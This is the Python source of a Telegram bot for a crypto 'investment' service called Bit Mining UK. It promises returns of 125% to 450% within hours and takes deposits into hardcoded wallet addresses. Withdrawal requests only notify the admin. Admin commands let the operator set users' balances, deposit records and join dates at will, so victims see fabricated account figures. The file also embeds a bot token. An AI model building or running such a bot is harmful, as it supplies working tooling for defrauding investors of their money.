import sqlite3
import time
import logging
import re
from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)
from PIL import Image, ImageDraw, ImageFont
import qrcode
import os
import uuid
import random  # For cool feature (random tip)

# Enable logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Bot credentials
BOT_TOKEN = "7092381471:AAFD4Y_iNtodUacE8KIgp4BnOC50MR6sQgQ"
ADMIN_ID = 5488224205

# Wallet addresses
WALLET_ADDRESSES = {
    "BTC": "bc1q9jp4ud093qlrfmzxcrrf5cs76r7p8n6pwck8a6",
    "USDTtrc20": "TCd2KenzFXEgBGzL5LhjE6wH4cJkEGuW4A",
    "ETH": "0x6bd08AE5d2646dE23d071eC384ABda12373Fe309",
    "TRX": "TCd2KenzFXEgBGzL5LhjE6wH4cJkEGuW4A",
}

# Investment plans
PLANS = {
    "Plan 1": {"min": 50, "max": 499, "return": 1.25, "hours": 12},
    "Plan 2": {"min": 500, "max": 999, "return": 1.55, "hours": 24},
    "Plan 3": {"min": 1000, "max": 9999, "return": 2.55, "hours": 48},
    "Plan 4": {"min": 5000, "max": float("inf"), "return": 4.50, "hours": 72},
}

# States for conversation handlers
PLAN, AMOUNT, CRYPTO, TXID, WITHDRAW_AMOUNT, WITHDRAW_CONFIRM, SETTING_FIELD, SETTING_VALUE = range(8)

# Database setup
def init_db():
    conn = sqlite3.connect("database.db")
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        full_name TEXT,
        email TEXT,
        date_joined TEXT,
        balance REAL DEFAULT 0,
        wallet TEXT,
        level TEXT,
        status TEXT,
        active_deposits TEXT,
        last_deposit TEXT,
        last_withdraw TEXT,
        referral_code TEXT,
        referred_by TEXT,
        referral_count INTEGER DEFAULT 0,
        rewards REAL DEFAULT 0,
        preferred_currency TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS deposits (
        deposit_id TEXT PRIMARY KEY,
        user_id INTEGER,
        amount REAL,
        plan TEXT,
        crypto TEXT,
        tx_id TEXT,
        timestamp REAL,
        expiry REAL,
        status TEXT
    )''')
    conn.commit()
    conn.close()

# Initialize database
init_db()

# Generate referral code
def generate_referral_code():
    return str(uuid.uuid4())[:8]

# Get or create user
def get_or_create_user(user_id, username, full_name, email=""):
    conn = sqlite3.connect("database.db")
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    user = c.fetchone()
    if not user:
        referral_code = generate_referral_code()
        c.execute("INSERT INTO users (user_id, username, full_name, email, date_joined, referral_code) VALUES (?, ?, ?, ?, ?, ?)",
                  (user_id, username, full_name, email, "N/A", referral_code))
        conn.commit()
    conn.close()

# Update user field
def update_user_field(user_id, field, value):
    conn = sqlite3.connect("database.db")
    c = conn.cursor()
    try:
        c.execute(f"UPDATE users SET {field} = ? WHERE user_id = ?", (value, user_id))
        c.execute("SELECT changes()")
        changes = c.fetchone()[0]
        conn.commit()
        success = changes > 0
        if not success:
            logger.error(f"No rows updated for user_id {user_id}, field {field}, value {value}")
        return success
    except sqlite3.Error as e:
        logger.error(f"SQLite error updating {field} for user_id {user_id}: {str(e)}")
        conn.rollback()
        return False
    except Exception as e:
        logger.error(f"Unexpected error updating {field} for user_id {user_id}: {str(e)}")
        conn.rollback()
        return False
    finally:
        conn.close()

# Get user data
def get_user_data(user_id):
    conn = sqlite3.connect("database.db")
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    user = c.fetchone()
    conn.close()
    return user

# Generate QR code
def generate_qr_code(address):
    qr = qrcode.QRCode(version=1, box_size=10, border=4)
    qr.add_data(address)
    qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    img.save("qr.png")
    return "qr.png"

# Generate summary image
def generate_summary_image(user_data):
    img = Image.new("RGB", (400, 600), color=(255, 165, 0))  # Orange base
    draw = ImageDraw.Draw(img)
    # White middle
    draw.rectangle([(50, 50), (350, 550)], fill=(255, 255, 255))
    # Orange top/bottom/sides
    draw.rectangle([(0, 0), (400, 50)], fill=(255, 165, 0))
    draw.rectangle([(0, 550), (400, 600)], fill=(255, 165, 0))
    draw.rectangle([(0, 50), (50, 550)], fill=(255, 165, 0))
    draw.rectangle([(350, 50), (400, 550)], fill=(255, 165, 0))
    
    try:
        font = ImageFont.truetype("arialbd.ttf", 18)  # Smaller font size for better fit
        title_font = ImageFont.truetype("arialbd.ttf", 24)  # Smaller title to make it fully visible
    except:
        font = ImageFont.load_default()
        title_font = ImageFont.load_default()
    
    # Add title (centered)
    title_text = "Bit Mining UK Account Summary"
    title_width = draw.textlength(title_text, font=title_font)
    draw.text(((400 - title_width) / 2, 10), title_text, fill=(0, 0, 0), font=title_font)
    
    fields = [
        ".Full Name: ",
        ".Username: ",
        ".Balance: ",
        ".Active Deposits: ",
        ".Last Deposit: ",
        ".Last Withdraw: ",
        ".Level: ",
        ".Status: ",
        ".Referral Count: ",
        ".Rewards: ",
        ".Date Joined: ",
    ]
    
    values = [
        user_data[2] or 'N/A',
        user_data[1] or 'N/A',
        f"${user_data[5]:,.2f}" if user_data[5] is not None else '$0.00',
        user_data[9] or 'None',
        user_data[10] or 'None',
        user_data[11] or 'None',
        user_data[7] or 'N/A',
        user_data[8] or 'N/A',
        str(user_data[14] or 0),
        f"${user_data[15]:,.2f}" if user_data[15] is not None else '$0.00',
        user_data[4] or 'N/A',
    ]
    
    y = 60  # Start higher to fit
    for field, value in zip(fields, values):
        draw.text((60, y), field, fill=(0, 0, 0), font=font)
        draw.text((200, y), value, fill=(0, 128, 0), font=font)  # Green for values
        y += 35  # Reduced increment to fit in white area
    
    # Add footer text centered on orange bottom
    footer_text = "Your success is our priority!"
    footer_width = draw.textlength(footer_text, font=font)
    draw.text(((400 - footer_width) / 2, 560), footer_text, fill=(255, 255, 255), font=font)
    
    img.save("summary.png")
    return "summary.png"

# Main menu
def main_menu():
    keyboard = [
        ["/deposit 💸", "/dashboard 💼"],
        ["/withdraw ⬆️", "/reinvest 🔄"],
        ["/summary 📊", "/profile 👤"],
        ["/setting ⚙️", "/support 📞"],
        ["/referral 👥"],
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# Plan selection menu
def plan_menu():
    keyboard = [
        ["🎯 Plan 1 (50-499 USD, 125% in 12h)"],
        ["🎯 Plan 2 (500-999 USD, 155% in 24h)"],
        ["🎯 Plan 3 (1000-9999 USD, 255% in 48h)"],
        ["🎯 Plan 4 (5000+ USD, 450% in 72h)"],
        ["⬅️ Back to Main Menu"],
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# Crypto selection menu
def crypto_menu():
    keyboard = [
        ["💰 BTC", "💰 USDTtrc20"],
        ["💰 ETH", "💰 TRX"],
        ["⬅️ Back to Main Menu"],
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# Withdraw confirmation menu
def withdraw_confirm_menu():
    keyboard = [
        ["✅ Yes", "❌ No"],
        ["⬅️ Back to Main Menu"],
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# Setting selection menu
def setting_menu():
    keyboard = [
        ["Username", "Full Name"],
        ["Email", "Wallet"],
        ["⬅️ Back to Main Menu"],
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# Start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    get_or_create_user(user.id, user.username, user.full_name)
    tips = [
        "💡 Tip: Start with a small deposit to test the waters!",
        "💡 Tip: Refer friends to earn extra rewards!",
        "💡 Tip: Check your wallet in settings for smooth withdrawals!",
        "💡 Tip: Maximize profits with higher plans!"
    ]
    tip = random.choice(tips)
    await update.message.reply_text(
        f"👋 Welcome to Bit Mining UK! 🎉\nChoose an option below:\n\n{tip}",
        reply_markup=main_menu()
    )
    logger.info(f"User {user.id} started the bot")

# Deposit conversation
async def deposit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = get_user_data(user_id)
    logger.info(f"Deposit command triggered for user {user_id}")
    if not user_data[6]:  # Check wallet
        await update.message.reply_text(
            "❌ Please set your wallet via /setting first! 🚫",
            reply_markup=main_menu()
        )
        return ConversationHandler.END
    await update.message.reply_text("🎯 Select an investment plan:", reply_markup=plan_menu())
    return PLAN

async def deposit_plan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    plan_text = update.message.text
    logger.info(f"Selected plan: {plan_text}")
    if plan_text == "⬅️ Back to Main Menu":
        await update.message.reply_text("👋 Back to main menu:", reply_markup=main_menu())
        return ConversationHandler.END
    plan = plan_text.split(" (")[0].replace("🎯 ", "")
    if plan not in PLANS:
        await update.message.reply_text("❌ Invalid plan. Please select a valid plan: 🚫", reply_markup=plan_menu())
        return PLAN
    context.user_data["plan"] = plan
    plan_data = PLANS[plan]
    await update.message.reply_text(
        f"🎉 Great choice! {plan} offers {plan_data['return']*100}% in {plan_data['hours']}h! 🎉\n"
        f"💸 How much do you want to invest? (Min ${plan_data['min']} Max ${plan_data['max']}):",
        reply_markup=ReplyKeyboardRemove()
    )
    return AMOUNT

async def deposit_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        amount = float(update.message.text)
        plan = PLANS[context.user_data["plan"]]
        if amount < plan["min"] or amount > plan["max"]:
            await update.message.reply_text(
                f"❌ Invalid amount. Please enter between ${plan['min']} and ${plan['max']}. 🚫",
                reply_markup=plan_menu()
            )
            return AMOUNT
        context.user_data["amount"] = amount
        await update.message.reply_text(
            "💰 Select cryptocurrency:\n\n💡 Tip: Send funds to the mentioned address to avoid permanent loss!",
            reply_markup=crypto_menu()
        )
        return CRYPTO
    except ValueError:
        await update.message.reply_text("❌ Please enter a valid number. 🚫", reply_markup=plan_menu())
        return AMOUNT

async def deposit_crypto(update: Update, context: ContextTypes.DEFAULT_TYPE):
    crypto = update.message.text.replace("💰 ", "")
    if crypto == "⬅️ Back to Main Menu":
        await update.message.reply_text("👋 Back to main menu:", reply_markup=main_menu())
        return ConversationHandler.END
    if crypto not in WALLET_ADDRESSES:
        await update.message.reply_text("❌ Invalid cryptocurrency. Please select a valid option: 🚫", reply_markup=crypto_menu())
        return CRYPTO
    context.user_data["crypto"] = crypto
    amount = context.user_data["amount"]
    await update.message.reply_text(
        f"💰 Deposit ${amount:,.2f} in {crypto} 📥",
        reply_markup=ReplyKeyboardRemove()
    )
    address = WALLET_ADDRESSES[crypto]
    qr_path = generate_qr_code(address)
    await update.message.reply_photo(
        photo=open(qr_path, "rb"),
        caption=f"💰 Send ${amount:,.2f} in {crypto} to:\n{address}\n\nPlease send the Transaction ID after depositing: 📤",
        reply_markup=ReplyKeyboardRemove()
    )
    os.remove(qr_path)
    return TXID

async def deposit_txid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["tx_id"] = update.message.text
    user_id = update.effective_user.id
    plan = context.user_data["plan"]
    amount = context.user_data["amount"]
    crypto = context.user_data["crypto"]
    tx_id = context.user_data["tx_id"]
    deposit_id = str(uuid.uuid4())
    timestamp = time.time()
    expiry = timestamp + PLANS[plan]["hours"] * 3600
    conn = sqlite3.connect("database.db")
    c = conn.cursor()
    c.execute("INSERT INTO deposits (deposit_id, user_id, amount, plan, crypto, tx_id, timestamp, expiry, status) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
              (deposit_id, user_id, amount, plan, crypto, tx_id, timestamp, expiry, "pending"))
    c.execute("UPDATE users SET last_deposit = ? WHERE user_id = ?", (time.strftime("%Y-%m-%d %H:%M:%S"), user_id))
    conn.commit()
    conn.close()
    plan_data = PLANS[plan]
    await update.message.reply_text(
        f"✅ Your deposit of ${amount:,.2f} on {plan} for {plan_data['return']*100}% profit after {plan_data['hours']}h has been submitted. 🎉 It will be confirmed soon.",
        reply_markup=main_menu()
    )
    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=f"🔔 New Deposit Request\nUser ID: {user_id}\nAmount: ${amount:,.2f}\nPlan: {plan}\nCrypto: {crypto}\nTX ID: {tx_id}"
    )
    return ConversationHandler.END

# Reinvest conversation
async def reinvest(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = get_user_data(user_id)
    logger.info(f"Reinvest command triggered for user {user_id}")
    if user_data[5] <= 0:
        await update.message.reply_text(
            "❌ Your balance is $0. Please deposit first! 🚫",
            reply_markup=main_menu()
        )
        return ConversationHandler.END
    await update.message.reply_text("🎯 Select a reinvestment plan:", reply_markup=plan_menu())
    return PLAN

async def reinvest_plan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    plan_text = update.message.text
    logger.info(f"Selected reinvest plan: {plan_text}")
    if plan_text == "⬅️ Back to Main Menu":
        await update.message.reply_text("👋 Back to main menu:", reply_markup=main_menu())
        return ConversationHandler.END
    plan = plan_text.split(" (")[0].replace("🎯 ", "")
    if plan not in PLANS:
        await update.message.reply_text("❌ Invalid plan. Please select a valid plan: 🚫", reply_markup=plan_menu())
        return PLAN
    context.user_data["plan"] = plan
    user_data = get_user_data(update.effective_user.id)
    plan_data = PLANS[plan]
    await update.message.reply_text(
        f"🎉 Great choice! {plan} offers {plan_data['return']*100}% in {plan_data['hours']}h! 🎉\n"
        f"💸 How much do you want to reinvest? (Min ${plan_data['min']} Max ${min(plan_data['max'], user_data[5]):,.2f}):",
        reply_markup=ReplyKeyboardRemove()
    )
    return AMOUNT

async def reinvest_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        amount = float(update.message.text)
        user_data = get_user_data(update.effective_user.id)
        plan = PLANS[context.user_data["plan"]]
        if amount < plan["min"] or amount > min(plan["max"], user_data[5]):
            await update.message.reply_text(
                f"❌ Invalid amount. Please enter between ${plan['min']} and ${min(plan['max'], user_data[5]):,.2f}. 🚫",
                reply_markup=plan_menu()
            )
            return AMOUNT
        user_id = update.effective_user.id
        plan = context.user_data["plan"]
        deposit_id = str(uuid.uuid4())
        timestamp = time.time()
        expiry = timestamp + PLANS[plan]["hours"] * 3600
        conn = sqlite3.connect("database.db")
        c = conn.cursor()
        c.execute("INSERT INTO deposits (deposit_id, user_id, amount, plan, timestamp, expiry, status) VALUES (?, ?, ?, ?, ?, ?, ?)",
                  (deposit_id, user_id, amount, plan, timestamp, expiry, "pending"))
        conn.commit()
        conn.close()
        plan_data = PLANS[plan]
        await update.message.reply_text(
            f"✅ Your reinvestment of ${amount:,.2f} on {plan} for {plan_data['return']*100}% profit after {plan_data['hours']}h has been submitted. 🎉 It will be confirmed soon.",
            reply_markup=main_menu()
        )
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"🔔 New Reinvestment Request\nUser ID: {user_id}\nAmount: ${amount:,.2f}\nPlan: {plan}"
        )
        return ConversationHandler.END
    except ValueError:
        await update.message.reply_text("❌ Please enter a valid number. 🚫", reply_markup=plan_menu())
        return AMOUNT

# Withdraw conversation
async def withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = get_user_data(user_id)
    logger.info(f"Withdraw command triggered for user {user_id}")
    if not user_data[6]:
        await update.message.reply_text(
            "❌ Please set your wallet via /setting first! 🚫",
            reply_markup=main_menu()
        )
        return ConversationHandler.END
    if user_data[5] <= 0:
        await update.message.reply_text(
            "❌ Your balance is $0. No funds to withdraw! 🚫",
            reply_markup=main_menu()
        )
        return ConversationHandler.END
    await update.message.reply_text(
        f"⬆️ Enter amount to withdraw (Max: ${user_data[5]:,.2f}):\n\n💡 Tip: Double check wallet address to avoid permanent loss!",
        reply_markup=ReplyKeyboardRemove()
    )
    return WITHDRAW_AMOUNT

async def withdraw_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        amount = float(update.message.text)
        user_data = get_user_data(update.effective_user.id)
        if amount <= 0 or amount > user_data[5]:
            await update.message.reply_text(
                f"❌ Invalid amount. Please enter between $0.01 and ${user_data[5]:,.2f}. 🚫",
                reply_markup=main_menu()
            )
            return WITHDRAW_AMOUNT
        context.user_data["withdraw_amount"] = amount
        await update.message.reply_text(
            f"⬆️ Withdrawal Request\nAmount: ${amount:,.2f}\nTo Wallet: {user_data[6]}\n\nIs this address correct? ✅❌",
            reply_markup=withdraw_confirm_menu()
        )
        return WITHDRAW_CONFIRM
    except ValueError:
        await update.message.reply_text("❌ Please enter a valid number. 🚫", reply_markup=main_menu())
        return WITHDRAW_AMOUNT

async def withdraw_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    choice = update.message.text
    if choice in ["❌ No", "⬅️ Back to Main Menu"]:
        await update.message.reply_text("👋 Back to main menu:", reply_markup=main_menu())
        return ConversationHandler.END
    if choice != "✅ Yes":
        await update.message.reply_text("❌ Invalid choice. Please select a valid option: 🚫", reply_markup=withdraw_confirm_menu())
        return WITHDRAW_CONFIRM
    user_id = update.effective_user.id
    amount = context.user_data["withdraw_amount"]
    user_data = get_user_data(user_id)
    await update.message.reply_text(
        f"✅ Your withdrawal request of ${amount:,.2f} to wallet {user_data[6]} has been submitted. 🎉 After blockchain confirmation, you will receive your funds.",
        reply_markup=main_menu()
    )
    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=f"🔔 New Withdrawal Request\nUser ID: {user_id}\nAmount: ${amount:,.2f}"
    )
    return ConversationHandler.END

# Dashboard
async def dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    logger.info(f"Dashboard command triggered for user {user_id}")
    user_data = get_user_data(user_id)
    if user_data is None:
        logger.error(f"No user data found for user_id {user_id}")
        await update.message.reply_text(
            "❌ Error: User data not found. Please contact support. 🚫",
            reply_markup=main_menu()
        )
        return
    balance = user_data[5] if user_data[5] is not None else 0
    rewards = user_data[15] if user_data[15] is not None else 0
    text = (
        f"💼 Dashboard\n\n"
        f"👤 Full Name: {user_data[2] or 'N/A'}\n"
        f"📛 Username: {user_data[1] or 'N/A'}\n"
        f"💰 Balance: ${balance:,.2f}\n"
        f"📈 Active Deposits: {user_data[9] or 'None'}\n"
        f"📥 Last Deposit: {user_data[10] or 'None'}\n"
        f"📤 Last Withdraw: {user_data[11] or 'None'}\n"
        f"🏅 Level: {user_data[7] or 'N/A'}\n"
        f"🔔 Status: {user_data[8] or 'N/A'}\n"
        f"👥 Referral Count: {user_data[14] or 0}\n"
        f"🎁 Rewards: ${rewards:,.2f}\n"
        f"📅 Date Joined: {user_data[4] or 'N/A'}"
    )
    await update.message.reply_text(text, reply_markup=main_menu())

# Summary
async def summary(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    logger.info(f"Summary command triggered for user {user_id}")
    user_data = get_user_data(user_id)
    img_path = generate_summary_image(user_data)
    await update.message.reply_photo(
        photo=open(img_path, "rb"),
        caption="📊 Your BIT-MINING UK account summary! 🎉",
        reply_markup=main_menu()
    )
    os.remove(img_path)

# Profile
async def profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    logger.info(f"Profile command triggered for user {user_id}")
    user_data = get_user_data(user_id)
    text = (
        f"👤 Profile\n\n"
        f"📛 Username: {user_data[1] or 'N/A'}\n"
        f"👤 Full Name: {user_data[2] or 'N/A'}\n"
        f"📧 Email: {user_data[3] or 'N/A'}\n"
        f"💳 Wallet: {user_data[6] or 'N/A'}\n"
        f"🏅 Level: {user_data[7] or 'N/A'}\n"
        f"🔔 Status: {user_data[8] or 'N/A'}\n"
        f"📅 Date Joined: {user_data[4] or 'N/A'}\n"
        f"👥 Referral Count: {user_data[14] or 0}"
    )
    await update.message.reply_text(text, reply_markup=main_menu())

# Setting conversation
async def setting(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    logger.info(f"Setting command triggered for user {user_id}")
    await update.message.reply_text("⚙️ Select a field to update:", reply_markup=setting_menu())
    return SETTING_FIELD

async def setting_field(update: Update, context: ContextTypes.DEFAULT_TYPE):
    field = update.message.text
    logger.info(f"Selected setting field: {field}")
    if field == "⬅️ Back to Main Menu":
        await update.message.reply_text("👋 Back to main menu:", reply_markup=main_menu())
        return ConversationHandler.END
    if field not in ["Username", "Full Name", "Email", "Wallet"]:
        await update.message.reply_text("❌ Invalid field. Please select a valid option: 🚫", reply_markup=setting_menu())
        return SETTING_FIELD
    context.user_data["field"] = field.lower().replace(" ", "_")
    user_data = get_user_data(update.effective_user.id)
    field_map = {"username": 1, "full_name": 2, "email": 3, "wallet": 6}
    current_value = user_data[field_map[context.user_data["field"]]] or "N/A"
    await update.message.reply_text(
        f"Current {field}: {current_value}\nEnter new value:",
        reply_markup=ReplyKeyboardRemove()
    )
    return SETTING_VALUE

async def setting_value(update: Update, context: ContextTypes.DEFAULT_TYPE):
    field = context.user_data["field"]
    value = update.message.text
    success = update_user_field(update.effective_user.id, field, value)
    if success:
        await update.message.reply_text(
            f"✅ {field.replace('_', ' ').title()} updated successfully! 🎉",
            reply_markup=main_menu()
        )
    else:
        await update.message.reply_text(
            f"❌ Failed to update {field.replace('_', ' ').title()}. Please try again: 🚫",
            reply_markup=main_menu()
        )
    return ConversationHandler.END

# Support
async def support(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    logger.info(f"Support command triggered for user {user_id}")
    await update.message.reply_text(
        "Contact us ON EMAIL bitminingukmail@gmail.com for help! \nWe are 24/7 online! 📩",
        reply_markup=main_menu()
    )

# Referral
async def referral(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    logger.info(f"Referral command triggered for user {user_id}")
    user_data = get_user_data(user_id)
    rewards = user_data[15] if user_data[15] is not None else 0
    text = (
        f"🌟 Your Referral Link: https://t.me/BitMiningUKBot?start={user_data[12]}\n"
        f"👥 Referred: {user_data[14] or 0} friends\n"
        f"💰 Rewards: ${rewards:,.2f}"
    )
    await update.message.reply_text(text, reply_markup=main_menu())

# Admin commands
async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized access. 🚫", reply_markup=main_menu())
        return
    cmd = update.message.text.split()[0][1:]
    args = update.message.text.split()[1:]
    if len(args) < 2:
        await update.message.reply_text("❌ Invalid command format. Use: /<command> <user_id> <value> 🚫", reply_markup=main_menu())
        return
    try:
        user_id = int(args[0])
        if cmd in ["set_datejoined", "set_last_deposit", "set_last_withdraw"]:
            value = " ".join(args[1:])
            if cmd in ["set_last_deposit", "set_last_withdraw"]:
                pattern = r'^\d{4}-\d{2}-\d{2} \$\d+(?:\.\d{2})?$'
                if not re.match(pattern, value):
                    await update.message.reply_text(
                        "❌ Invalid format. Use YYYY-MM-DD $amount (e.g., 2025-09-10 $1000.00). 🚫",
                        reply_markup=main_menu()
                    )
                    return
            elif cmd == "set_datejoined":
                date_pattern = r'^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}$'
                if not re.match(date_pattern, value):
                    await update.message.reply_text(
                        "❌ Invalid date format. Use YYYY-MM-DD HH:MM:SS (e.g., 2025-09-10 22:24:00). 🚫",
                        reply_markup=main_menu()
                    )
                    return
        else:
            value = args[1]
            if cmd == "set_balance":
                value = float(value)
        
        user_data = get_user_data(user_id)
        if not user_data:
            await update.message.reply_text(
                f"❌ User ID {user_id} not found in the database. 🚫",
                reply_markup=main_menu()
            )
            return
        
        success = update_user_field(user_id, cmd.split("_")[1], value)
        if success:
            updated_user_data = get_user_data(user_id)
            updated_value = updated_user_data[4] if cmd == "set_datejoined" else value
            await update.message.reply_text(
                f"✅ {cmd.split('_')[1].title()} updated for user {user_id} to {updated_value}. 🎉",
                reply_markup=main_menu()
            )
            logger.info(f"Admin updated {cmd.split('_')[1]} for user {user_id} to {value}")
        else:
            await update.message.reply_text(
                f"❌ Failed to update {cmd.split('_')[1].title()} for user {user_id}. Check logs for details. 🚫",
                reply_markup=main_menu()
            )
            logger.error(f"Failed to update {cmd.split('_')[1]} for user {user_id}")
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid user ID or value. Ensure user_id is a number and value is correct for the command. 🚫",
            reply_markup=main_menu()
        )

async def set_active_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized access. 🚫", reply_markup=main_menu())
        return
    args = update.message.text.split()[1:]
    if len(args) < 3:
        await update.message.reply_text("❌ Invalid command format. 🚫", reply_markup=main_menu())
        return
    user_id, amount, plan = args[0], args[1], " ".join(args[2:])
    try:
        user_id = int(user_id)
        amount = float(amount)
        if plan not in PLANS:
            await update.message.reply_text("❌ Invalid plan. 🚫", reply_markup=main_menu())
            return
        conn = sqlite3.connect("database.db")
        c = conn.cursor()
        c.execute("UPDATE users SET active_deposits = ? WHERE user_id = ?", (f"{plan}: ${amount:,.2f}", user_id))
        conn.commit()
        conn.close()
        await update.message.reply_text(f"✅ Active deposit set for user {user_id}. 🎉", reply_markup=main_menu())
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID or amount. 🚫", reply_markup=main_menu())

async def send_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized access. 🚫", reply_markup=main_menu())
        return
    args = update.message.text.split(maxsplit=2)
    if len(args) < 3:
        await update.message.reply_text("❌ Invalid command format. Use: /send_message <user_id> <message> 🚫", reply_markup=main_menu())
        return
    try:
        user_id = int(args[1])
        message = args[2]
        await context.bot.send_message(
            chat_id=user_id,
            text=message,
            reply_markup=main_menu()
        )
        await update.message.reply_text(f"✅ Message sent to user {user_id}. 🎉", reply_markup=main_menu())
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID. 🚫", reply_markup=main_menu())
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to send message: {str(e)} 🚫", reply_markup=main_menu())

# Auto-expiry check
async def check_expiry(context: ContextTypes.DEFAULT_TYPE):
    conn = sqlite3.connect("database.db")
    c = conn.cursor()
    current_time = time.time()
    c.execute("SELECT deposit_id, user_id, amount, plan FROM deposits WHERE expiry <= ? AND status = ?", (current_time, "pending"))
    deposits = c.fetchall()
    for deposit in deposits:
        deposit_id, user_id, amount, plan = deposit
        profit = amount * PLANS[plan]["return"]
        c.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (profit, user_id))
        c.execute("UPDATE deposits SET status = ? WHERE deposit_id = ?", ("completed", deposit_id))
        c.execute("UPDATE users SET active_deposits = ? WHERE user_id = ?", ("None", user_id))
        conn.commit()
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"🔔 Deposit Matured\nUser ID: {user_id}\nPlan: {plan}\nAmount: ${amount:,.2f}\nProfit: ${profit:,.2f}"
        )
    conn.close()

def main():
    application = Application.builder().token(BOT_TOKEN).build()

    # Conversation handlers
    deposit_conv = ConversationHandler(
        entry_points=[CommandHandler("deposit", deposit)],
        states={
            PLAN: [MessageHandler(filters.TEXT & ~filters.COMMAND, deposit_plan)],
            AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, deposit_amount)],
            CRYPTO: [MessageHandler(filters.TEXT & ~filters.COMMAND, deposit_crypto)],
            TXID: [MessageHandler(filters.TEXT & ~filters.COMMAND, deposit_txid)],
        },
        fallbacks=[],
    )
    
    reinvest_conv = ConversationHandler(
        entry_points=[CommandHandler("reinvest", reinvest)],
        states={
            PLAN: [MessageHandler(filters.TEXT & ~filters.COMMAND, reinvest_plan)],
            AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, reinvest_amount)],
        },
        fallbacks=[],
    )
    
    withdraw_conv = ConversationHandler(
        entry_points=[CommandHandler("withdraw", withdraw)],
        states={
            WITHDRAW_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, withdraw_amount)],
            WITHDRAW_CONFIRM: [MessageHandler(filters.TEXT & ~filters.COMMAND, withdraw_confirm)],
        },
        fallbacks=[],
    )
    
    setting_conv = ConversationHandler(
        entry_points=[CommandHandler("setting", setting)],
        states={
            SETTING_FIELD: [MessageHandler(filters.TEXT & ~filters.COMMAND, setting_field)],
            SETTING_VALUE: [MessageHandler(filters.TEXT & ~filters.COMMAND, setting_value)],
        },
        fallbacks=[],
    )
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(deposit_conv)
    application.add_handler(reinvest_conv)
    application.add_handler(withdraw_conv)
    application.add_handler(setting_conv)
    application.add_handler(CommandHandler("dashboard", dashboard))
    application.add_handler(CommandHandler("summary", summary))
    application.add_handler(CommandHandler("profile", profile))
    application.add_handler(CommandHandler("support", support))
    application.add_handler(CommandHandler("referral", referral))
    application.add_handler(CommandHandler(["set_balance", "set_fullname", "set_email", "set_datejoined", "set_level", "set_status", "set_wallet", "set_username", "set_last_withdraw"], admin_command))
    application.add_handler(CommandHandler("set_active_deposit", set_active_deposit))
    application.add_handler(CommandHandler("send_message", send_message))
    
    # Job queue for expiry check
    application.job_queue.run_repeating(check_expiry, interval=60)
    
    # Run the bot with explicit error handling
    application.run_polling(allowed_updates=Update.ALL_TYPES, timeout=30)

if __name__ == "__main__":
    main()